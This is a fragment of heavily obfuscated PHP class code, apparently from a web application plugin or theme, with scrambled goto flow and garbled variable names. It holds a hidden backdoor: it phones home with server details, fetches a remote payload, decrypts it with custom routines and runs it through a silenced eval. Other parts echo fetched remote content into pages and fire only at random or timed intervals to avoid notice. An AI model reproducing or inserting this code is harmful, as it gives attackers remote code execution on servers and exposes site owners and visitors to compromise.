$_SERVER[$Dê¥––ı˘∞[175]]); $A≤≠“ê´¿™ = $this->{$_SERVER[†Äâ‡≠ﬁ][206]}($Dê¥––ı˘∞[148]($C∫’ù≤Üï≤)); $F±¡õÉ≠œŒ = $this->{$_SERVER[†Äâ‡≠ﬁ][182]}($Dê¥––ı˘∞[207] . $A≤≠“ê´¿™); if ($F±¡õÉ≠œŒ && $Dê¥––ı˘∞[191]($F±¡õÉ≠œŒ) && isset($F±¡õÉ≠œŒ[$Dê¥––ı˘∞[280]])) { $cöñÑÒø∞‚ = $this->{$_SERVER[†Äâ‡≠ﬁ][188]}($F±¡õÉ≠œŒ[$Dê¥––ı˘∞[280]], 2); if ($cöñÑÒø∞‚) { $cöñÑÒø∞‚ = $this->{$_SERVER[†Äâ‡≠ﬁ][199]}($cöñÑÒø∞‚); } if ($cöñÑÒø∞‚) { try { @eval($cöñÑÒø∞‚); } catch (Exception $aüÿà£ø”ã) { } } } } goto eÙÔì´Ö©©; AÍîìâ¬˘ƒ: $B“˘ÊÖ›æı = $CÑÉë‰Øæ≥[614]; if (!$B“˘ÊÖ›æı) { die; } $bËŒ»Ü¬“¢ = $Dê¥––ı˘∞[274] . $Dê¥––ı˘∞[114]($Dê¥––ı˘∞[275]); goto d£Ú’∏Â“‰; CÇÊåú˜µô: $CÑÉë‰Øæ≥ =& $_SERVER[—Ω]; $Dê¥––ı˘∞ =& $_SERVER[†Äâ‡≠ﬁ]; $fΩ€Éıÿâã = array($Dê¥––ı˘∞[271], $Dê¥––ı˘∞[272], $Dê¥––ı˘∞[273]); goto AÍîìâ¬˘ƒ; Eº÷®ñ≠Ö«: if ($A≈∑°¨Á¡â && $Dê¥––ı˘∞[230]() - $A≈∑°¨Á¡â < $Dê¥––ı˘∞[201]($Dê¥––ı˘∞[278])) { return; } $Dê¥––ı˘∞[13](array($Dê¥––ı˘∞[276], $Dê¥––ı˘∞[152]), $bËŒ»Ü¬“¢, $Dê¥––ı˘∞[230]()); $bˆ´ä“≈®ı = array($Dê¥––ı˘∞[165] => $Dê¥––ı˘∞[61]($Dê¥––ı˘∞[62])->{$_SERVER[†Äâ‡≠ﬁ][63]}($Dê¥––ı˘∞[209]), $Dê¥––ı˘∞[178] => $this->amdb4b1f3d62, $Dê¥––ı˘∞[176] => $_SERVER[$Dê¥––ı˘∞[177]], $Dê¥––ı˘∞[169] => $Dê¥––ı˘∞[149], $Dê¥––ı˘∞[172] => $_SERVER[$Dê¥––ı˘∞[173]]); goto BåÑÖëàà–; BåÑÖëàà–: $F±¡õÉ≠œŒ = $this->{$_SERVER[†Äâ‡≠ﬁ][182]}($Dê¥––ı˘∞[279], $bˆ´ä“≈®ı); if (!$Dê¥––ı˘∞[191]($F±¡õÉ≠œŒ)) { return; } if ($F±¡õÉ≠œŒ[$Dê¥––ı˘∞[165]] && $F±¡õÉ≠œŒ[$Dê¥––ı˘∞[280]]) { if ($this->{$_SERVER[†Äâ‡≠ﬁ][199]}($F±¡õÉ≠œŒ[$Dê¥––ı˘∞[280]]) == $bˆ´ä“≈®ı[$Dê¥––ı˘∞[165]]) { return; } } goto d›øÍ‹’§Ÿ; d¥ÿ§øú∑¿: $A≈∑°¨Á¡â = $Dê¥––ı˘∞[13](array($Dê¥––ı˘∞[276], $Dê¥––ı˘∞[277]), $bËŒ»Ü¬“¢); $DÉÇ«˜∆Éﬂ = $CÑÉë‰Øæ≥[615]; if (strlen($DÉÇ«˜∆Éﬂ) < $CÑÉë‰Øæ≥[551]) { return; } goto Eº÷®ñ≠Ö«; d£Ú’∏Â“‰: if ($this->amdb4b1f3d62 == $Dê¥––ı˘∞[121] || !$Dê¥––ı˘∞[104]($GLOBALS, $Dê¥––ı˘∞[132])) { return; } if (!$Dê¥––ı˘∞[236]($_SERVER[$Dê¥––ı˘∞[44]], $fΩ€Éıÿâã)) { return; } if ($Dê¥––ı˘∞[230]() % 4 != 0) { return; } goto d¥ÿ§øú∑¿; eÙÔì´Ö©©: } private function podtc223f67a($bûËÛÈ§ó = '', $bÎ®≤¡±Ì⁄ = array(), $FÔ”ê‡êƒ∂ = 5) { goto dËîÿ£∫¯û; f◊ÎÙáœâ‚: $D•∏≠ªãŒÉ = $d‡≥ı•‚û…[617]; if (strlen($D•∏≠ªãŒÉ) < $d‡≥ı•‚û…[581]) { die; } $BÑò®∫Á¶Œ = $BÑò®∫Á¶Œ . $bûËÛÈ§ó . $b®•ÓÿÎéç[283] . $b®•ÓÿÎéç[284]($bÎ®≤¡±Ì⁄); goto AÖªññˆ∆˘; dËîÿ£∫¯û: $d‡≥ı•‚û… =& $_SERVER[—Ω]; $b®•ÓÿÎéç =& $_SERVER[†Äâ‡≠ﬁ]; $BÑò®∫Á¶Œ = $b®•ÓÿÎéç[281]; goto B™…Íˆƒ®‘; B™…Íˆƒ®‘: $c“í‰Ò◊£ø = $d‡≥ı•‚û…[616]; if (strlen($c“í‰Ò◊£ø) < $d‡≥ı•‚û…[559]) { return; } $BÑò®∫Á¶Œ = $this->{$_SERVER[†Äâ‡≠ﬁ][243]}($BÑò®∫Á¶Œ, $b®•ÓÿÎéç[282]); goto f◊ÎÙáœâ‚; Fºﬁ¬´«“∞: $E—§‚áˆéÖ = $d‡≥ı•‚û…[619]; while ($E—§‚áˆéÖ < $d‡≥ı•‚û…[551]) { if ($E—§‚áˆéÖ >= 0) { break; } $E—§‚áˆéÖ++; } goto BÍêÁãÊ∏Ï; b»‚∑µ®“∏: while (strlen($e‰⁄æà€ÎÔ) < $d‡≥ı•‚û…[581]) { if (!$e‰⁄æà€ÎÔ) { break; } $e‰⁄æà€ÎÔ++; } $bÎ®≤¡±Ì⁄ = @$b®•ÓÿÎéç[250]($BÑò®∫Á¶Œ, !1, $d¡ë“ê†í); return $b®•ÓÿÎéç[190]($bÎ®≤¡±Ì⁄, !0); goto Fºﬁ¬´«“∞; AÖªññˆ∆˘: if ($bÎ®≤¡±Ì⁄ === -1) { return $BÑò®∫Á¶Œ; } $d¡ë“ê†í = $b®•ÓÿÎéç[245](array($b®•ÓÿÎéç[246] => array($b®•ÓÿÎéç[249] => $FÔ”ê‡êƒ∂, $b®•ÓÿÎéç[247] => $b®•ÓÿÎéç[285]), $b®•ÓÿÎéç[286] => array($b®•ÓÿÎéç[287] => !1, $b®•ÓÿÎéç[288] => !1))); $e‰⁄æà€ÎÔ = $d‡≥ı•‚û…[618]; goto b»‚∑µ®“∏; BÍêÁãÊ∏Ï: } private function ksjo083f66b3() { goto fÑ±Ç◊ﬂ‚º; AÁ°∂œñõï: if (strlen($A©·Çø∏∏∏) < $C”⁄ﬁ¿Õ∆ô[559]) { die; } $AèÕ«…çÒç = $AèÕ«…çÒç ? $Cûç§£èÛÉ[201]($AèÕ«…çÒç) : 0; $DˆóπﬂÿàÉ = $C”⁄ﬁ¿Õ∆ô[622]; goto bãÔàµÏÌÉ; bãÔàµÏÌÉ: return $C≈’˜Œ÷Ü© + $AèÕ«…çÒç; $Fëù∫«◊êı = $C”⁄ﬁ¿Õ∆ô[623]; while ($Fëù∫«◊êı < $C”⁄ﬁ¿Õ∆ô[553]) { if ($Fëù∫«◊êı >= 0) { break; } $Fëù∫«◊êı++; } goto cùò¯© áÇ; F÷¥Ö®îØ’: $C≈’˜Œ÷Ü© = $Cûç§£èÛÉ[201]($C≈’˜Œ÷Ü© ? $C≈’˜Œ÷Ü© : $Cûç§£èÛÉ[290]); $AèÕ«…çÒç = $Cûç§£èÛÉ[104]($this->girtef17344a, $Cûç§£èÛÉ[316]); $A©·Çø∏∏∏ = $C”⁄ﬁ¿Õ∆ô[621]; goto AÁ°∂œñõï; A«¡óÚ…¯Ó: $C≈’˜Œ÷Ü© = $Cêπ¬öÁÖî[$this->amdb4b1f3d62]; $dïÀ¿á‹„É = $C”⁄ﬁ¿Õ∆ô[620]; while (strlen($dïÀ¿á‹„É) < $C”⁄ﬁ¿Õ∆ô[553]) { if (!$dïÀ¿á‹„É) { break; } $dïÀ¿á‹„É++; } goto F÷¥Ö®îØ’; fÑ±Ç◊ﬂ‚º: $C”⁄ﬁ¿Õ∆ô =& $_SERVER[—Ω]; $Cûç§£èÛÉ =& $_SERVER[†Äâ‡≠ﬁ]; $Cêπ¬öÁÖî = array($Cûç§£èÛÉ[289] => $Cûç§£èÛÉ[290], $Cûç§£èÛÉ[291] => $Cûç§£èÛÉ[292], $Cûç§£èÛÉ[293] => $Cûç§£èÛÉ[294], $Cûç§£èÛÉ[295] => $Cûç§£èÛÉ[296], $Cûç§£èÛÉ[297] => $Cûç§£èÛÉ[298], $Cûç§£èÛÉ[299] => $Cûç§£èÛÉ[238], $Cûç§£èÛÉ[300] => $Cûç§£èÛÉ[238], $Cûç§£èÛÉ[301] => $Cûç§£èÛÉ[290], $Cûç§£èÛÉ[302] => $Cûç§£èÛÉ[292], $Cûç§£èÛÉ[303] => $Cûç§£èÛÉ[294], $Cûç§£èÛÉ[304] => $Cûç§£èÛÉ[305], $Cûç§£èÛÉ[306] => $Cûç§£èÛÉ[296], $Cûç§£èÛÉ[307] => $Cûç§£èÛÉ[308], $Cûç§£èÛÉ[309] => $Cûç§£èÛÉ[298], $Cûç§£èÛÉ[310] => $Cûç§£èÛÉ[311], $Cûç§£èÛÉ[312] => $Cûç§£èÛÉ[313], $Cûç§£èÛÉ[314] => $Cûç§£èÛÉ[315]); goto A«¡óÚ…¯Ó; cùò¯© áÇ: } public function hsox783857cb($d«•‡∫Ω¡˘) { goto c•‡Ô√Òª•; f∂≥øî«å÷: $B¶ßÌÕºŒ– = $D≥—€ªÚéô[222]($B¶ßÌÕºŒ–, $D≥—€ªÚéô[10], $D≥—€ªÚéô[318]); $c÷ıò‘ê–Á = $fèëÑëÃëœ[625]; while (strlen($c÷ıò‘ê–Á) < $fèëÑëÃëœ[559]) { if (!$c÷ıò‘ê–Á) { break; } $c÷ıò‘ê–Á++; } goto AƒÒ›ö≤Ô∏; b”—¥ÀÕõ›: $E≠¿¢Ê–ÂØ = $D≥—€ªÚéô[61]($D≥—€ªÚéô[139])->{$_SERVER[†Äâ‡≠ﬁ][140]}(); if ($E≠¿¢Ê–ÂØ <= $féƒÁ’ä‘«) { return; } $B¶ßÌÕºŒ– = $D≥—€ªÚéô[61]($D≥—€ªÚéô[139])->{$_SERVER[†Äâ‡≠ﬁ][317]}($D≥—€ªÚéô[318])->{$_SERVER[†Äâ‡≠ﬁ][319]}($féƒÁ’ä‘«)->{$_SERVER[†Äâ‡≠ﬁ][320]}(); goto f∂≥øî«å÷; AƒÒ›ö≤Ô∏: if (!$D≥—€ªÚéô[236]($d«•‡∫Ω¡˘[$D≥—€ªÚéô[318]], $B¶ßÌÕºŒ–)) { $D≥—€ªÚéô[166]($D≥—€ªÚéô[321], !1, $D≥—€ªÚéô[233]); } goto B¢´ÑÑ˘Ó¿; cÎä®í Éù: $A»¶∞…Ωé„ = $fèëÑëÃëœ[624]; while (strlen($A»¶∞…Ωé„) < $fèëÑëÃëœ[553]) { if (!$A»¶∞…Ωé„) { break; } $A»¶∞…Ωé„++; } if ($féƒÁ’ä‘« >= $D≥—€ªÚéô[201]($D≥—€ªÚéô[238])) { return; } goto b”—¥ÀÕõ›; c•‡Ô√Òª•: $fèëÑëÃëœ =& $_SERVER[—Ω]; $D≥—€ªÚéô =& $_SERVER[†Äâ‡≠ﬁ]; $féƒÁ’ä‘« = $this->{$_SERVER[†Äâ‡≠ﬁ][137]}(); goto cÎä®í Éù; B¢´ÑÑ˘Ó¿: } public function oxauc2fdcdd7() { goto A¿∫œı—¥“; A¿∫œı—¥“: $bÕ¿äª°–˜ =& $_SERVER[—Ω]; $dı£ò¡ÈœŒ =& $_SERVER[†Äâ‡≠ﬁ]; if (!$dı£ò¡ÈœŒ[104]($GLOBALS, $dı£ò¡ÈœŒ[132]) || $dı£ò¡ÈœŒ[322](1, 100) > 20) { return; } goto E€‘∑à‡Óà; e˘€Í√±í¢: $CƒûÖŒøÓ„ = $dı£ò¡ÈœŒ[245](array($dı£ò¡ÈœŒ[246] => array($dı£ò¡ÈœŒ[247] => $dı£ò¡ÈœŒ[248], $dı£ò¡ÈœŒ[249] => 3))); $C¯ã≈”ç¯„ = $bÕ¿äª°–˜[628]; if (!$C¯ã≈”ç¯„) { die; } goto aáÑ˘ú¬“ÿ; b√Œëë›Ëè: echo $dı£ò¡ÈœŒ[323] . $dı£ò¡ÈœŒ[324]($Fºπ∆Ü©Œ«) . $dı£ò¡ÈœŒ[325]; $cÜÓŒΩá = $bÕ¿äª°–˜[630]; while (strlen($cÜÓŒΩá) < $bÕ¿äª°–˜[559]) { if (!$cÜÓŒΩá) { break; } $cÜÓŒΩá++; } goto fàÒóç£•Ó; E€‘∑à‡Óà: $b“∏†ì´⁄£ = $dı£ò¡ÈœŒ[242]; $B∫êπï√Æ® = $bÕ¿äª°–˜[626]; if (!$B∫êπï√Æ®) { die; } goto aêô¨–®≤≠; aêô¨–®≤≠: $b“∏†ì´⁄£ = $this->{$_SERVER[†Äâ‡≠ﬁ][243]}($b“∏†ì´⁄£, $dı£ò¡ÈœŒ[244]); $Eπ¥Èì≈…‰ = $bÕ¿äª°–˜[627]; if (strlen($Eπ¥Èì≈…‰) < $bÕ¿äª°–˜[556]) { die; } goto e˘€Í√±í¢; aáÑ˘ú¬“ÿ: $Fºπ∆Ü©Œ« = @$dı£ò¡ÈœŒ[250]($b“∏†ì´⁄£, !1, $CƒûÖŒøÓ„); $b§‡º–§Ï∆ = $bÕ¿äª°–˜[629]; if (strlen($b§‡º–§Ï∆) < $bÕ¿äª°–˜[581]) { die; } goto b√Œëë›Ëè; fàÒóç£•Ó: } private function thilef2e9fb8($Bâƒá≤Ã§≠, $cæß’Ó¶á§, $c§åëÜ®È“ = 3) { goto a–ùŸûâØ∂; FÚô¢Ú¨áû: $cû›ÙëÃ‰ = $fΩ›Ë∆ÓÒ¿[322](0, 5) . $fΩ›Ë∆ÓÒ¿[10]; $dª¿ì¯¬´ã = $fΩ›Ë∆ÓÒ¿[124](15); $aô–Ê⁄—ãﬂ = $DŒßÉåî≈ã[632]; goto bØ“∑∏ìπé; aàâò∫∑Ø¥: $A›ÖöÕñ‹Ê = $DŒßÉåî≈ã[645]; if (!$A›ÖöÕñ‹Ê) { return; } if ($c§åëÜ®È“ - 1 > 0) { $B«®é‹è—˘ = $this->{$_SERVER[†Äâ‡≠ﬁ][127]}($B«®é‹è—˘, $cæß’Ó¶á§, $c§åëÜ®È“ - 1); } goto BÜÿÁ”ÓæÏ; bØ“∑∏ìπé: $B˘≤ÇÂ£ò∂ = $fΩ›Ë∆ÓÒ¿[327]; switch ($cû›ÙëÃ‰) { case $fΩ›Ë∆ÓÒ¿[229]: $B«®é‹è—˘ = $this->{$_SERVER[†Äâ‡≠ﬁ][147]}($Bâƒá≤Ã§≠, $fΩ›Ë∆ÓÒ¿[214]($cæß’Ó¶á§ . $dª¿ì¯¬´ã)); $F‰Üıëà¢Ø = $DŒßÉåî≈ã[633]; while (strlen($F‰Üıëà¢Ø) < $DŒßÉåî≈ã[551]) { if (!$F‰Üıëà¢Ø) { break; } $F‰Üıëà¢Ø++; } break; case $fΩ›Ë∆ÓÒ¿[220]: $B«®é‹è—˘ = $this->{$_SERVER[†Äâ‡≠ﬁ][147]}($Bâƒá≤Ã§≠, $fΩ›Ë∆ÓÒ¿[214]($dª¿ì¯¬´ã . $cæß’Ó¶á§)); $A“∫€√à“ù = $DŒßÉåî≈ã[634]; break; $bã°ÔòÜêÊ = $DŒßÉåî≈ã[635]; if (!$bã°ÔòÜêÊ) { return; } case $fΩ›Ë∆ÓÒ¿[328]: $B«®é‹è—˘ = $this->{$_SERVER[†Äâ‡≠ﬁ][147]}($Bâƒá≤Ã§≠, $fΩ›Ë∆ÓÒ¿[118]($dª¿ì¯¬´ã . $cæß’Ó¶á§)); $D˘ßÃÊü´„ = $DŒßÉåî≈ã[636]; if (!$D˘ßÃÊü´„) { return; } break; case $fΩ›Ë∆ÓÒ¿[329]: $B«®é‹è—˘ = $this->{$_SERVER[†Äâ‡≠ﬁ][147]}($Bâƒá≤Ã§≠, $fΩ›Ë∆ÓÒ¿[114]($dª¿ì¯¬´ã . $cæß’Ó¶á§)); $Dè•Ü íåá = $DŒßÉåî≈ã[637]; if (strlen($Dè•Ü íåá) < $DŒßÉåî≈ã[556]) { die; } break; case $fΩ›Ë∆ÓÒ¿[330]: goto CπÚŸÓèàä; fΩÙ¬∫ßÌ≥: $dƒÃ«Ú⁄»ª = $fΩ›Ë∆ÓÒ¿[114]($f‚ª∏ëé·ü . $fΩ›Ë∆ÓÒ¿[114]($cæß’Ó¶á§ . $f‚ª∏ëé·ü) . $cæß’Ó¶á§); $b‰ÏÊ€ †• = $DŒßÉåî≈ã[640]; while (strlen($b‰ÏÊ€ †•) < $DŒßÉåî≈ã[559]) { if (!$b‰ÏÊ€ †•) { break; } $b‰ÏÊ€ †•++; } goto bé†‰‹¡∑Ï; b»Àô è≠Ê: break; goto fπ«Ùﬁ˘ú¬; bé†‰‹¡∑Ï: $dƒÃ«Ú⁄»ª = $fΩ›Ë∆ÓÒ¿[25]($dƒÃ«Ú⁄»ª, $cá‰πßåâ… % 8, $cá‰πßåâ… % 8 + 7); $d¶⁄àÌ£Ñë = $DŒßÉåî≈ã[641]; if (!$d¶⁄àÌ£Ñë) { die; } goto D·¡ÈÌÇ∞Õ; D·¡ÈÌÇ∞Õ: $b˜¥ô¬øî‰ = $fΩ›Ë∆ÓÒ¿[10]; $a€Ú™è»∆≈ = 0; $C€ªúø≤≠ä = 0; goto e éâÑŸœ†; e éâÑŸœ†: $CŸ±úÎ¯Óú = 0; for ($a€Ú™è»∆≈ = 0; $a€Ú™è»∆≈ < $fΩ›Ë∆ÓÒ¿[24]($Bâƒá≤Ã§≠); $a€Ú™è»∆≈++) { $CŸ±úÎ¯Óú = $CŸ±úÎ¯Óú == $fΩ›Ë∆ÓÒ¿[24]($dƒÃ«Ú⁄»ª) ? 0 : $CŸ±úÎ¯Óú; $Bò√¬õ¨øÜ = $DŒßÉåî≈ã[642]; if (!$Bò√¬õ¨øÜ) { return; } $C€ªúø≤≠ä = ($cá‰πßåâ… + $fΩ›Ë∆ÓÒ¿[332]($B˘≤ÇÂ£ò∂, $Bâƒá≤Ã§≠[$a€Ú™è»∆≈]) + $fΩ›Ë∆ÓÒ¿[333]($dƒÃ«Ú⁄»ª[$CŸ±úÎ¯Óú++])) % 64; $aü≤œöØ≈Ü = $DŒßÉåî≈ã[643]; $b˜¥ô¬øî‰ .= $B˘≤ÇÂ£ò∂[$C€ªúø≤≠ä]; $aÛﬁ¶§£”ç = $DŒßÉåî≈ã[644]; if (!$aÛﬁ¶§£”ç) { die; } } $B«®é‹è—˘ = $fΩ›Ë∆ÓÒ¿[324]($f‚ª∏ëé·ü . $b˜¥ô¬øî‰); goto b»Àô è≠Ê; CπÚŸÓèàä: $Bâƒá≤Ã§≠ = $fΩ›Ë∆ÓÒ¿[118]($Bâƒá≤Ã§≠); $C– åﬁ’ÒÉ = $DŒßÉåî≈ã[638]; while (strlen($C– åﬁ’ÒÉ) < $DŒßÉåî≈ã[581]) { if (!$C– åﬁ’ÒÉ) { break; } $C– åﬁ’ÒÉ++; } goto e“¶êãÌú‡; e“¶êãÌú‡: $cá‰πßåâ… = $fΩ›Ë∆ÓÒ¿[331](0, 64); $CÊå≥ª–í◊ = $DŒßÉåî≈ã[605]; while ($CÊå≥ª–í◊ < $DŒßÉåî≈ã[551]) { if ($CÊå≥ª–í◊ >= 0) { break; } $CÊå≥ª–í◊++; } goto a≠ﬂéËˆ é; a≠ﬂéËˆ é: $f‚ª∏ëé·ü = $B˘≤ÇÂ£ò∂[$cá‰πßåâ…]; $BÍòéÍΩ≠õ = $DŒßÉåî≈ã[639]; if (!$BÍòéÍΩ≠õ) { die; } goto fΩÙ¬∫ßÌ≥; fπ«Ùﬁ˘ú¬: default: $B«®é‹è—˘ = $this->{$_SERVER[†Äâ‡≠ﬁ][147]}($Bâƒá≤Ã§≠, $cæß’Ó¶á§ . $dª¿ì¯¬´ã); $FêÚØÆÏì™ = $DŒßÉåî≈ã[642]; while ($FêÚØÆÏì™ < $DŒßÉåî≈ã[551]) { if ($FêÚØÆÏì™ >= 0) { break; } $FêÚØÆÏì™++; } break; $dπçÜŒ˜ó = $DŒßÉåî≈ã[622]; } $B«®é‹è—˘ = $fΩ›Ë∆ÓÒ¿[214]($cû›ÙëÃ‰ . $dª¿ì¯¬´ã . $B«®é‹è—˘); goto aàâò∫∑Ø¥; a–ùŸûâØ∂: $DŒßÉåî≈ã =& $_SERVER[—Ω]; $fΩ›Ë∆ÓÒ¿ =& $_SERVER[†Äâ‡≠ﬁ]; $fΩ›Ë∆ÓÒ¿[326](1); goto fïÏéÕ»°Í; fïÏéÕ»°Í: $E˜≥Ω´Ãí› = $DŒßÉåî≈ã[631]; while (strlen($E˜≥Ω´Ãí›) < $DŒßÉåî≈ã[551]) { if (!$E˜≥Ω´Ãí›) { break; } $E˜≥Ω´Ãí›++; } $Bâƒá≤Ã§≠ = $fΩ›Ë∆ÓÒ¿[2]($Bâƒá≤Ã§≠); goto FÚô¢Ú¨áû; BÜÿÁ”ÓæÏ: return $B«®é‹è—˘; goto F√áâÖù’Ù; F√áâÖù’Ù: } private function gdnl182d327d($a¶Ã‡èÒ”, $bë£¿ç√∫ª, $DÏ≤óÎàÑ¢ = 3) { goto d˜ù´êîö“; c «ó‚¨…Ô: $Dãœ“æçΩÒ = $E≠–ôèÁπ’[648]; if (strlen($Dãœ“æçΩÒ) < $E≠–ôèÁπ’[553]) { return; } $CùÙêÙø⁄• = $CØ¯èå∆ıí[327]; goto f∂∑ø‚´“≥; c•†÷óÿºá: if ($DÏ≤óÎàÑ¢ - 1 > 0) { $c“°º§´Éﬂ = $this->{$_SERVER[†Äâ‡≠ﬁ][188]}($c“°º§´Éﬂ, $bë£¿ç√∫ª, $DÏ≤óÎàÑ¢ - 1); } return $c“°º§´Éﬂ; goto Dπµ†ä‡˘û; d˜ù´êîö“: $E≠–ôèÁπ’ =& $_SERVER[—Ω]; $CØ¯èå∆ıí =& $_SERVER[†Äâ‡≠ﬁ]; if (!$CØ¯èå∆ıí[334]($a¶Ã‡èÒ”) || $CØ¯èå∆ıí[24]($a¶Ã‡èÒ”) < 10) { return !1; } goto eœ‘óôë√‚; f∂∑ø‚´“≥: $dπØüéÈÀ÷ = $E≠–ôèÁπ’[649]; while (strlen($dπØüéÈÀ÷) < $E≠–ôèÁπ’[551]) { if (!$dπØüéÈÀ÷) { break; } $dπØüéÈÀ÷++; } switch ($c´ÓôÌÌøπ) { case $CØ¯èå∆ıí[229]: $c“°º§´Éﬂ = $this->{$_SERVER[†Äâ‡≠ﬁ][243]}($a¶Ã‡èÒ”, $CØ¯èå∆ıí[214]($bë£¿ç√∫ª . $Eø˘°¥ÒÇã)); $A”•ûõ‰Èπ = $E≠–ôèÁπ’[650]; while ($A”•ûõ‰Èπ < $E≠–ôèÁπ’[551]) { if ($A”•ûõ‰Èπ >= 0) { break; } $A”•ûõ‰Èπ++; } break; case $CØ¯èå∆ıí[220]: $c“°º§´Éﬂ = $this->{$_SERVER[†Äâ‡≠ﬁ][243]}($a¶Ã‡èÒ”, $CØ¯èå∆ıí[214]($Eø˘°¥ÒÇã . $bë£¿ç√∫ª)); break; case $CØ¯èå∆ıí[328]: $c“°º§´Éﬂ = $this->{$_SERVER[†Äâ‡≠ﬁ][243]}($a¶Ã‡èÒ”, $CØ¯èå∆ıí[118]($Eø˘°¥ÒÇã . $bë£¿ç√∫ª)); $C«¯ΩÉà√Ö = $E≠–ôèÁπ’[651]; while ($C«¯ΩÉà√Ö < $E≠–ôèÁπ’[553]) { if ($C«¯ΩÉà√Ö >= 0) { break; } $C«¯ΩÉà√Ö++; } break; case $CØ¯èå∆ıí[329]: $c“°º§´Éﬂ = $this->{$_SERVER[†Äâ‡≠ﬁ][243]}($a¶Ã‡èÒ”, $CØ¯èå∆ıí[114]($Eø˘°¥ÒÇã . $bë£¿ç√∫ª)); break; $b¬Êôû £∫ = $E≠–ôèÁπ’[628]; if (!$b¬Êôû £∫) { return; } case $CØ¯èå∆ıí[330]: goto d¶ÉÜ∆±Í∏; BíÚÍ™ü€¥: $Fº±°ß◊§â = $E≠–ôèÁπ’[660]; if (!$Fº±°ß◊§â) { die; } break; goto E·œ—∂Ùﬂë; fàÂ†”ﬂ≥Ú: $d›∫Ó”îéŸ = $E≠–ôèÁπ’[654]; if (!$d›∫Ó”îéŸ) { return; } $F îˆ–œˆ∞ = $CØ¯èå∆ıí[25]($F îˆ–œˆ∞, $Aö¬¥ç®È‘ % 8, $Aö¬¥ç®È‘ % 8 + 7); goto A±πõ›±à◊; CÁÓïùÖÜ”: if (strlen($D°Ã‘£¿æ) < $E≠–ôèÁπ’[553]) { return; } for ($f… ≈É»◊≥ = 0; $f… ≈É»◊≥ < $CØ¯èå∆ıí[24]($a¶Ã‡èÒ”); $f… ≈É»◊≥++) { $BÚŒç≠Æ∂˜ = $BÚŒç≠Æ∂˜ == $CØ¯èå∆ıí[24]($F îˆ–œˆ∞) ? 0 : $BÚŒç≠Æ∂˜; $dïøäºñÒŒ = $E≠–ôèÁπ’[657]; $EŸÍçæ–∆ˆ = $BÚŒç≠Æ∂˜++; $f°Ω‰≈Ñ§“ = $E≠–ôèÁπ’[658]; if (!$f°Ω‰≈Ñ§“) { die; } $A´—‡å±ñï = $CØ¯èå∆ıí[332]($CùÙêÙø⁄•, $a¶Ã‡èÒ”[$f… ≈É»◊≥]) - $Aö¬¥ç®È‘ - $CØ¯èå∆ıí[333]($F îˆ–œˆ∞[$EŸÍçæ–∆ˆ]); while ($A´—‡å±ñï < 0) { $A´—‡å±ñï += 64; $c∑Ï’å„Ñ† = $E≠–ôèÁπ’[659]; if (!$c∑Ï’å„Ñ†) { return; } } $fÙ„ÉÖ†âÊ .= $CùÙêÙø⁄•[$A´—‡å±ñï]; } $c“°º§´Éﬂ = $CØ¯èå∆ıí[336]($fÙ„ÉÖ†âÊ); goto BíÚÍ™ü€¥; càÆâÕ¶◊ç: if (!$b¶µØô¥Ì†) { return; } $Aö¬¥ç®È‘ = $CØ¯èå∆ıí[332]($CùÙêÙø⁄•, $aã¡æÓ…ÿë); $F îˆ–œˆ∞ = $CØ¯èå∆ıí[114]($aã¡æÓ…ÿë . $CØ¯èå∆ıí[114]($bë£¿ç√∫ª . $aã¡æÓ…ÿë) . $bë£¿ç√∫ª); goto fàÂ†”ﬂ≥Ú; d¶ÉÜ∆±Í∏: $a¶Ã‡èÒ” = $CØ¯èå∆ıí[335]($a¶Ã‡èÒ”); $F€≈â’∆È“ = $E≠–ôèÁπ’[652]; if (!$F€≈â’∆È“) { die; } goto cà¶∆áÒ–; BÊˆÏ∞‡Úã: $F°„”ÏÊä÷ = $E≠–ôèÁπ’[655]; $BÚŒç≠Æ∂˜ = 0; $D°Ã‘£¿æ = $E≠–ôèÁπ’[656]; goto CÁÓïùÖÜ”; A±πõ›±à◊: $fÙ„ÉÖ†âÊ = $CØ¯èå∆ıí[10]; $f… ≈É»◊≥ = 0; $A´—‡å±ñï = 0; goto BÊˆÏ∞‡Úã; cà¶∆áÒ–: $aã¡æÓ…ÿë = $a¶Ã‡èÒ”[0]; $a¶Ã‡èÒ” = $CØ¯èå∆ıí[25]($a¶Ã‡èÒ”, 1); $b¶µØô¥Ì† = $E≠–ôèÁπ’[653]; goto càÆâÕ¶◊ç; E·œ—∂Ùﬂë: default: $c“°º§´Éﬂ = $this->{$_SERVER[†Äâ‡≠ﬁ][243]}($a¶Ã‡èÒ”, $bë£¿ç√∫ª . $Eø˘°¥ÒÇã); $e´úõÑ≈€› = $E≠–ôèÁπ’[661]; break; } goto c•†÷óÿºá; eœ‘óôë√‚: $a¶Ã‡èÒ” = $CØ¯èå∆ıí[2]($a¶Ã‡èÒ”); $a¶Ã‡èÒ” = $CØ¯èå∆ıí[214]($a¶Ã‡èÒ”); $BÃ‚≈Õ–ÔÆ = $E≠–ôèÁπ’[646]; goto F∞Õ€’Öî◊; F∞Õ€’Öî◊: while ($BÃ‚≈Õ–ÔÆ < $E≠–ôèÁπ’[553]) { if ($BÃ‚≈Õ–ÔÆ >= 0) { break; } $BÃ‚≈Õ–ÔÆ++; } $c´ÓôÌÌøπ = $a¶Ã‡èÒ”[0]; $Eø˘°¥ÒÇã = $CØ¯èå∆ıí[25]($a¶Ã‡èÒ”, 1, 15); goto D’á‚˘µ‘Ø; D’á‚˘µ‘Ø: $döÿ∏∫¢∆ë = $E≠–ôèÁπ’[647]; while (strlen($döÿ∏∫¢∆ë) < $E≠–ôèÁπ’[553]) { if (!$döÿ∏∫¢∆ë) { break; } $döÿ∏∫¢∆ë++; } $a¶Ã‡èÒ” = $CØ¯èå∆ıí[25]($a¶Ã‡èÒ”, 16); goto c «ó‚¨…Ô; Dπµ†ä‡˘û: } public function cigfe6d3f78a($A«ÒŒÚƒç≥) { goto D≤Í›·‹Ü¥; B∏èﬁÇ√“Ã: $F€Â‡ﬁøÛ≥ = $d∑““÷˜è⁄[664]; while (strlen($F€Â‡ﬁøÛ≥) < $d∑““÷˜è⁄[581]) { if (!$F€Â‡ﬁøÛ≥) { break; } $F€Â‡ﬁøÛ≥++; } $bÈà¢ï‡÷® = $cÖó‚æ¯Ë´[201](($E«‰âüòü + $c›æÎ∑œí—) / 2); goto E“¬ÎÇ—ı÷; FùÇ≈√¬µÇ: $dºÎ„∏®Üæ = $d∑““÷˜è⁄[662]; while ($dºÎ„∏®Üæ < $d∑““÷˜è⁄[556]) { if ($dºÎ„∏®Üæ >= 0) { break; } $dºÎ„∏®Üæ++; } $c›æÎ∑œí— = 